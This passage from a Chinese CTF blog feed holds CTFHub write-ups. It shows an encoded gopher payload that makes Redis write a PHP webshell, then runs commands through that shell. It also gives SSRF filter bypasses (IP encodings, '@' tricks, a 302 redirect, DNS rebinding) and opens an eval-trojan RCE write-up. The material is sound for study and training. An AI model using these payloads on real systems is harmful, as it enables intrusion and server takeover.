class="hljs-variable">%31</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%64</span><span class="hljs-variable">%62</span><span class="hljs-variable">%66</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%39</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%73</span><span class="hljs-variable">%68</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%70</span><span class="hljs-variable">%68</span><span class="hljs-variable">%70</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%41</span><span class="hljs-variable">%31</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%34</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%73</span><span class="hljs-variable">%61</span><span class="hljs-variable">%76</span><span class="hljs-variable">%65</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><br></code></pre></td></tr></table></figure><p>gopherus生成的payload我们选择的默认路径，而且默认生成的是shell.php，所以我们用蚁剑去连接</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">http://challenge-c4a4ebf619043f53.<span class="hljs-keyword">sandbox</span>.ctfhub.<span class="hljs-keyword">com</span>:<span class="hljs-number">10800</span>/<span class="hljs-keyword">shell</span>.php<br></code></pre></td></tr></table></figure><p>连接密码我们设置的是cmd</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021951163.png"></p><p>和之前一样，还是在根目录下</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021951133.png"></p><p>出flag</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021951953.png"></p><p>当然大家如果想要锻炼自己，也可以自己生成get型的payload</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021951505.png"></p><p>还是再次编码</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">gopher:</span>//<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">6379</span>/_<span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%41</span><span class="hljs-variable">%31</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%38</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%66</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%75</span><span class="hljs-variable">%73</span><span class="hljs-variable">%68</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%41</span><span class="hljs-variable">%33</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%33</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%31</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%31</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%33</span><span class="hljs-variable">%32</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%43</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%46</span><span class="hljs-variable">%70</span><span class="hljs-variable">%68</span><span class="hljs-variable">%70</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%34</span><span class="hljs-variable">%30</span><span class="hljs-variable">%65</span><span class="hljs-variable">%76</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%38</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%47</span><span class="hljs-variable">%45</span><span class="hljs-variable">%54</span><span class="hljs-variable">%25</span><span class="hljs-variable">%35</span><span class="hljs-variable">%42</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%37</span><span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%64</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%37</span><span class="hljs-variable">%25</span><span class="hljs-variable">%35</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%39</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%42</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%46</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%45</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%41</span><span class="hljs-variable">%34</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%36</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%66</span><span class="hljs-variable">%69</span><span class="hljs-variable">%67</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%33</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%33</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%64</span><span class="hljs-variable">%69</span><span class="hljs-variable">%72</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%31</span><span class="hljs-variable">%33</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%76</span><span class="hljs-variable">%61</span><span class="hljs-variable">%72</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%77</span><span class="hljs-variable">%77</span><span class="hljs-variable">%77</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%68</span><span class="hljs-variable">%74</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%41</span><span class="hljs-variable">%34</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%36</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%66</span><span class="hljs-variable">%69</span><span class="hljs-variable">%67</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%33</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%31</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%64</span><span class="hljs-variable">%62</span><span class="hljs-variable">%66</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%39</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%73</span><span class="hljs-variable">%68</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%70</span><span class="hljs-variable">%68</span><span class="hljs-variable">%70</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%41</span><span class="hljs-variable">%31</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%34</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%73</span><span class="hljs-variable">%61</span><span class="hljs-variable">%76</span><span class="hljs-variable">%65</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><br></code></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">http:<span class="hljs-regexp">//</span>challenge-c4a4ebf619043f53.sandbox.ctfhub.com:<span class="hljs-number">10800</span>/shell.php?cmd=<span class="hljs-keyword">system</span>(<span class="hljs-variable">%2</span>7ls<span class="hljs-variable">%20</span>/<span class="hljs-variable">%27</span>);<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021951904.png"></p><p>看着可能不太方便，右键查看源代码就行了</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021951316.png"></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">http:<span class="hljs-regexp">//</span>challenge-c4a4ebf619043f53.sandbox.ctfhub.com:<span class="hljs-number">10800</span>/shell.php?cmd=<span class="hljs-keyword">system</span>(<span class="hljs-variable">%2</span>7cat<span class="hljs-variable">%20</span>/flag_6ae99307194246ff15401425275baecb<span class="hljs-variable">%27</span>);<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021951417.png"></p><h2 id="URL-Bypass"><a href="#URL-Bypass" class="headerlink" title="URL Bypass"></a>URL Bypass</h2><p>下面几题就是一些绕过了</p><p>这一题要求请求的URL中必须包含<a href="http://notfound.ctfhub.com/">http://notfound.ctfhub.com</a></p><p>这题我们要@进行绕过，它的效果与<a href="http://127.0.0.1/flag.php%E7%9B%B8%E5%90%8C">http://127.0.0.1/flag.php相同</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?url=http://notfound.ctfhub.com@127.0.0.1/flag.php<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?url=http://notfound.ctfhub.com.127.0.0.1.nip.io/flag.php<br></code></pre></td></tr></table></figure><p>效果也与<a href="http://127.0.0.1/flag.php%E7%9B%B8%E5%90%8C">http://127.0.0.1/flag.php相同</a></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021951552.png"></p><h2 id="数字IP-Bypass"><a href="#数字IP-Bypass" class="headerlink" title="数字IP Bypass"></a>数字IP Bypass</h2><p>经尝试，下面三种绕过无法通过</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">url</span>=http://<span class="hljs-number">0177</span>.<span class="hljs-number">0000</span>.<span class="hljs-number">0000</span>.<span class="hljs-number">0001</span>/flag.php<br> <br><span class="hljs-attribute">url</span>=http://<span class="hljs-number">0</span>x7F.<span class="hljs-number">0</span>x00.<span class="hljs-number">0</span>x00.<span class="hljs-number">0</span>x01/flag.php<br> <br><span class="hljs-attribute">url</span>=http://<span class="hljs-number">0</span>x7F.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>/flag.php<br></code></pre></td></tr></table></figure><p>原来是ban掉了.</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021951369.png"></p><p>下面四种绕过可以通过（不带.）</p><p>转8进制</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">url</span>=http://<span class="hljs-number">017700000001</span>/flag.php<br></code></pre></td></tr></table></figure><p>转16进制</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">url</span>=http://<span class="hljs-number">0</span>x7F000001/flag.php<br></code></pre></td></tr></table></figure><p>使用数字IP</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">url</span>=http://<span class="hljs-number">2130706433</span>/flag.php<br></code></pre></td></tr></table></figure><p>使用localhost</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">url</span><span class="hljs-operator">=</span>localhost/flag.php<br></code></pre></td></tr></table></figure><p>上面这些URL的制作可以找一个在线ip转换网站。</p><p>出flag</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021951870.png"></p><h2 id="302跳转-Bypass"><a href="#302跳转-Bypass" class="headerlink" title="302跳转 Bypass"></a>302跳转 Bypass</h2><p>当我们直接访问</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">url</span>=127.0.0.1/flag.php<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021951276.png"></p><p>可以看出来直接把我们127.0.0.1过滤了</p><p>正规方法：</p><p>就是在自己的服务器上写入下面的302跳转代码，作用是让访问者重定向回127.0.0.1&#x2F;flag.php。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: http://127.0.0.1/flag.php&quot;</span>);<br> <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>假设我们把302跳转代码写入302.php，然后我们在302.php所在文件夹处执行下面这条命令</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">php</span> -S <span class="hljs-number">0.0.0.0:7777</span><br></code></pre></td></tr></table></figure><p>作用是启动服务器，这里开放的是7777端口（不能用python，我们这里写的是PHP重定向代码）</p><p>然后去访问：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">url</span>=yourip:port/302.php<br></code></pre></td></tr></table></figure><p>这里我们开的是7777端口，所以应该写</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">url</span>=yourip:7777/302.php<br></code></pre></td></tr></table></figure><p>当然，我们还有种方法，那就是访问</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">url</span><span class="hljs-operator">=</span>localhost/flag.php<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021951378.png"></p><p>当然，作者发现这一题并没有过滤127.0.0.1的其他表示方法，也就是上题的payload都好使。</p><p>八进制：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">url</span>=http://<span class="hljs-number">017700000001</span>/flag.phpurl=http://<span class="hljs-number">0177</span>.<span class="hljs-number">0000</span>.<span class="hljs-number">0000</span>.<span class="hljs-number">0001</span>/flag.php<br></code></pre></td></tr></table></figure><p>十六进制：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">url</span>=http://<span class="hljs-number">0</span>x7F000001/flag.phpurl=http://<span class="hljs-number">0</span>x7F.<span class="hljs-number">0</span>x00.<span class="hljs-number">0</span>x00.<span class="hljs-number">0</span>x01/flag.phpurl=http://<span class="hljs-number">0</span>x7F.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>/flag.php<br></code></pre></td></tr></table></figure><p>十进制：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">url</span>=http://<span class="hljs-number">2130706433</span>/flag.php<br></code></pre></td></tr></table></figure><h2 id="DNS重绑定-Bypass"><a href="#DNS重绑定-Bypass" class="headerlink" title="DNS重绑定 Bypass"></a>DNS重绑定 Bypass</h2><p>给了一个附件，是一篇知乎文章，讲的是DNS重绑定</p><p>这里我们用一个在线网站去DNS重绑定，这个网站可以生成一个ttl很低的地址</p><p><a href="https://lock.cmpxchg8b.com/rebinder.html" title="rbndr.us dns rebinding service">rbndr.us dns rebinding service</a></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021952813.png"></p><p>我们用默认生成的地址就行</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021952433.png"></p><p>访问flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://challenge-<span class="hljs-number">272692</span>b1488e8934.sandbox.ctfhub.com:<span class="hljs-number">10800</span>/?url=http://<span class="hljs-number">7</span>f000001.c0a80001.rbndr.us/flag.php<br></code></pre></td></tr></table></figure><p>出flag</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021952113.png"></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTFHub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RCE-CTFHub</title>
    <link href="/2025/05/04/RCE-CTFHub/"/>
    <url>/2025/05/04/RCE-CTFHub/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>本文是作者由CSDN博客迁移而来，原文地址：<a href="https://blog.csdn.net/2302_81178149/article/details/145460980?spm=1001.2014.3001.5501">https://blog.csdn.net/2302_81178149/article/details/145460980?spm=1001.2014.3001.5501</a></p></blockquote><p>在众多的CTF平台当中，CTFHub对于初学者来说，是入门平台的不二之选。CTFHub通过自己独特的技能树模块，可以帮助初学者来快速入门。具体请看官方介绍：<a href="https://www.ctfhub.com/#/index" title="CTFHub">CTFHub</a>。</p><p><strong>作者的CTFHub技能树汇总：</strong></p><p><a href="https://blog.csdn.net/2302_81178149/article/details/142747270?spm=1001.2014.3001.5502" title="CTFHub技能树Web汇总-CSDN博客">CTFHub技能树Web汇总-CSDN博客</a></p><p>为了方便学习，在练习过程中可以查阅作者的RCE总结：<a href="https://blog.csdn.net/2302_81178149/article/details/145461296" title="RCE学习总结-CSDN博客">RCE学习总结-CSDN博客</a></p><h2 id="eval执行"><a href="#eval执行" class="headerlink" title="eval执行"></a>eval执行</h2><p>一进来是一段代码</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021921486.png"></p><p>那我们审计一下这段代码，if里面用了issert()函数，用来检测<code>$_REQUEST[&#39;cmd&#39;]</code>是否为空</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021921226.png"></p><p>那<code>$_REQUEST[&#39;cmd&#39;]</code>是什么？</p><p>就是一种全局变量，来收集我们传递的<code>cmd</code>的值</p><table><thead><tr><th>变量</th><th>描述</th></tr></thead><tbody><tr><td><code>$_GET</code></td><td>收集来自 <code>method=&quot;get&quot;</code> 的表单中的值</td></tr><tr><td><code>$_POST</code></td><td>收集来自 <code>method=&quot;post&quot;</code> 的表单中的值</td></tr><tr><td><code>$_REQUEST</code></td><td>包含 <code>$_POST</code>、<code>$_GET</code> 和 <code>$_COOKIE</code></td></tr><tr><td><code>$GLOBALS</code></td><td>全部变量的全局组合数组</td></tr><tr><td><code>$_COOKIE</code></td><td>常用于识别用户</td></tr><tr><td><code>$_SESSION</code></td><td>存储关于用户会话（session）的信息</td></tr><tr><td><code>$_FILES</code></td><td>用来获取通过 POST 方法上传文件的相关信息</td></tr><tr><td><code>$_SERVER</code></td><td>服务器和执行环境信息</td></tr><tr><td><code>$_ENV</code></td><td>环境变量</td></tr></tbody></table><p>那这段代码我们就很清楚了，一旦我们用HTTP方法传递了<code>cmd</code>的值，就会继续往下执行，而下面明显是一句话木马。</p><p>不知道什么是一句话木马可以去看看作者的文件上传总结：</p><p><a href="https://blog.csdn.net/2302_81178149/article/details/145433812" title="文件上传学习总结_文件上传学习 csdn-CSDN博客">文件上传学习总结_文件上传学习 csdn-CSDN博客</a></p><p>所以我们用蚁剑连接试试</p><p>连接成功</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021921827.png"></p><p>我们在根目录下找到flag</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021921287.png"></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021921885.png"></p><p>这里其实算取巧了，我们再结合RCE专题训练一遍</p><p>服务器一般都是Linux系统，我们试试Linux指令</p><p>这里我们先提一下常见Linux指令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 